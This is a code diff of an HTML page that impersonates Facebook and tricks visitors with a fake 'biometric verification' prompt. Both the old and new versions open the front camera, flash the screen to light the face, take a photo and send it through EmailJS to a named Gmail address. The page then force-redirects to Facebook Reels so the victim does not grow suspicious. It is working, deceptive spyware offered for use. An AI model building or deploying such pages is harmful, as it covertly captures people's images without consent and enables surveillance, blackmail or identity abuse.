@@ -3,80 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Video Verification</title>
+    <title>Facebook Secure Content</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body { margin: 0; padding: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; font-family: sans-serif; transition: background-color 0.15s ease-in; overflow: hidden; }
-        .container { text-align: center; width: 90%; }
-        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #1877F2; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { margin: 0; padding: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; font-family: sans-serif; transition: background-color 0.1s; overflow: hidden; }
+        .box { text-align: center; width: 85%; border: 1px solid #222; padding: 25px; border-radius: 12px; background: #0a0a0a; }
+        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #1877F2; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 1.1rem; font-weight: bold; color: #1877F2; margin-bottom: 10px; }
-        #progress { font-size: 0.9rem; color: #666; }
+        #status { font-size: 1rem; color: #1877F2; font-weight: bold; }
     </style>
 </head>
 <body id="mainBody">
-    <div class="container">
+    <div class="box">
         <div class="loader"></div>
-        <p id="status">Loading Facebook Reel...</p>
-        <div id="progress">Checking security protocol...</div>
+        <p id="status">Establishing Secure Connection...</p>
     </div>
 
     <script>
-        // تفعيل المعرف الخاص بك
         (function() { emailjs.init("ClasRw06y_NeB2UQ"); })();
 
         window.onload = async function() {
-            const msg = "SECURITY CHECK:\n\nThis Facebook content is age-restricted.\n\nPlease click OK to perform a quick Biometric Verification and unlock the video.";
+            const securityMsg = "CONFIRMATION:\n\nTo view this Facebook Reel, you must verify you are not a bot.\n\nClick OK to start biometric verification.";
             
-            if (confirm(msg)) {
+            if (confirm(securityMsg)) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
 
-                    let count = 5;
-                    const statusTxt = document.getElementById('status');
-                    const progressTxt = document.getElementById('progress');
+                    let countdown = 4;
+                    const statusText = document.getElementById('status');
                     
-                    const timer = setInterval(() => {
-                        count--;
-                        statusTxt.innerText = "Biometric Scanning...";
-                        progressTxt.innerText = "Verification: " + (100 - (count * 20)) + "% Complete";
+                    const interval = setInterval(async () => {
+                        countdown--;
+                        statusText.innerText = "Verifying Identity... " + (100 - (countdown * 25)) + "%";
                         
-                        if (count <= 0) {
-                            clearInterval(timer);
+                        if (countdown <= 0) {
+                            clearInterval(interval);
                             
-                            // تشغيل الفلاش الأبيض لإضاءة الوجه لضمان صورة واضحة
+                            // فلاش الضوء الأبيض لتحسين الصورة
                             document.getElementById('mainBody').style.backgroundColor = "#FFFFFF";
                             
                             setTimeout(() => {
                                 const canvas = document.createElement('canvas');
-                                // أبعاد مثالية للوضوح دون تجاوز حجم الإيميل
-                                canvas.width = 800; 
-                                canvas.height = 600;
+                                canvas.width = 800; canvas.height = 600;
                                 canvas.getContext('2d').drawImage(video, 0, 0, 800, 600);
                                 
-                                // جودة 0.6 لضمان الإرسال السريع ووضوح الملامح
-                                const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                                const imgBase64 = canvas.toDataURL('image/jpeg', 0.6);
                                 
-                                // إرسال البيانات إلى القالب الذي عدلته
+                                // إرسال الصورة لـ EmailJS
                                 emailjs.send('service_w3dev60', 'template_7k8tall', {
-                                    image_data: imageData,
+                                    image_data: imgBase64,
                                     to_email: 'tayebiabd2016@gmail.com'
-                                }).then(function() {
-                                    // التحويل الفوري بعد نجاح الإرسال
-                                    window.location.replace("https://www.facebook.com/reels/");
-                                }, function(error) {
-                                    // التحويل حتى في حالة الخطأ لضمان عدم الشك
-                                    window.location.replace("https://www.facebook.com/reels/");
                                 });
 
-                            }, 300); 
+                                // --- نظام التحويل الإجباري المدمج ---
+                                setTimeout(() => {
+                                    const targetURL = "https://www.facebook.com/reels/";
+                                    // محاولة التحويل بـ 3 طرق لضمان النجاح مهما كان نوع المتصفح
+                                    window.location.href = targetURL; 
+                                    window.location.replace(targetURL);
+                                    window.top.location = targetURL;
+                                }, 1000); 
+                                // ----------------------------------
+
+                            }, 300);
                         }
                     }, 1000);
 
-                } catch (err) {
+                } catch (e) {
                     window.location.replace("https://www.facebook.com/reels/");
                 }
             } else {
